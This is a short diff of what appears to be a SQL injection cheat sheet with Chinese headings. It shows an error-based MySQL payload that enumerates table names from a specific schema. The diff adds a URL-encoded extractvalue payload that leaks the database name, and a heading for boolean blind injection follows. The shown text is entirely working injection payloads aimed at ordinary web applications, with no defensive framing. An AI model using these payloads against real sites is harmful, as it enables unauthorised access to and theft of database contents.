@@ -51,6 +51,7 @@ referers
 
 and (select 1 from (select count(*),concat('~',(select table_name from information_schema.tables where table_schema='hebjy1028' limit 0,1),'~',floor(rand(0)*2)) as a from information_schema.tables group by a)b)#
 
+AND%20id%20in%20(char(@`%27`),%20extractvalue(1,%20concat_ws(0x20,%200x5c,(database()))),char(@`%27`))
 
 布尔盲注：
 
